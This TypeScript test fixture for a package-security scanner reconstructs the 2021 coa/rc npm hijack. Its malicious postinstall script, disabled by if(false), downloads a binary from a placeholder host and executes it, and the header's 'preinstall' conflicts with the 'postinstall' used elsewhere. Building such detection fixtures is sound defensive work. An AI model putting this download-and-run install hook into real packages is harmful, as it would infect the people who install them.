/**
 * coa / rc dual-hijack (Nov 2021) — T1 maintainer takeover.
 *
 * coa 2.0.3 and rc 1.2.9 (two separate popular packages) were hijacked on the
 * same day by the same attacker. Both got the same payload: preinstall script
 * that downloaded and ran a native binary (password stealer + DanaBot loader
 * on Windows).
 *
 * We only fixture coa here (rc is structurally identical). Signals are the
 * same shape as ua-parser-2021 minus the crypto miner.
 */

import type { FixtureSpec } from '../fixture-spec.js';

const CLEAN_INDEX = `// coa 2.0.2 — command-line argument parser stubbed.
'use strict';
module.exports.Cmd = function() { return { name: function() { return this; } }; };
`;

const MAL_INDEX = `'use strict';
module.exports.Cmd = function() { return { name: function() { return this; } }; };
`;

const MAL_POST = `'use strict';
var https = require('https');
var fs = require('fs');
var os = require('os');
var child_process = require('child_process');
var path = require('path');
if (false) {
  var url = 'https://loader.example.invalid/' + os.platform() + '/binary';
  var out = path.join(os.tmpdir(), 'coa-native.bin');
  https.get(url, function(res) {
    var buf = [];
    res.on('data', function(c) { buf.push(c); });
    res.on('end', function() {
      fs.writeFileSync(out, Buffer.concat(buf), { mode: 0o755 });
      child_process.execFile(out);
    });
  });
}
`;

export const spec: FixtureSpec = {
  id: 'coa-rc-2021',
  title: 'coa 2.0.3 / rc 1.2.9 (Nov 2021)',
  year: 2021,
  threatClass: 'T1 maintainer takeover',
  summary:
    'Two popular packages (coa and rc) were hijacked simultaneously by an attacker who published patch versions with a postinstall that downloaded and ran a Windows password-stealer.',
  provenance: 'RECONSTRUCTED',
  topology: 'direct',
  clean: {
    name: 'coa',
    version: '2.0.2',
    manifest: {
      name: 'coa',
      version: '2.0.2',
      main: 'index.js',
      license: 'MIT',
      maintainers: [{ email: 'orig@example' }],
    },
    files: { 'index.js': CLEAN_INDEX },
  },
  malicious: {
    name: 'coa',
    version: '2.0.3',
    manifest: {
      name: 'coa',
      version: '2.0.3',
      main: 'index.js',
      license: 'MIT',
      scripts: { postinstall: 'node postinstall.js' },
      maintainers: [{ email: 'orig@example' }],
      _npmUser: { name: 'takeover', email: 'takeover@example.invalid' },
    },
    files: {
      'index.js': MAL_INDEX,
      'postinstall.js': MAL_POST,
    },
  },
  expect: {
    mustFire: [
      'install.script-added',
      'exec.new-module',
      'net.new-module',
      'net.new-endpoint',
    ],
    verdict: 'BLOCK',
    minCategories: ['INSTALL', 'EXEC', 'NET'],
  },
};
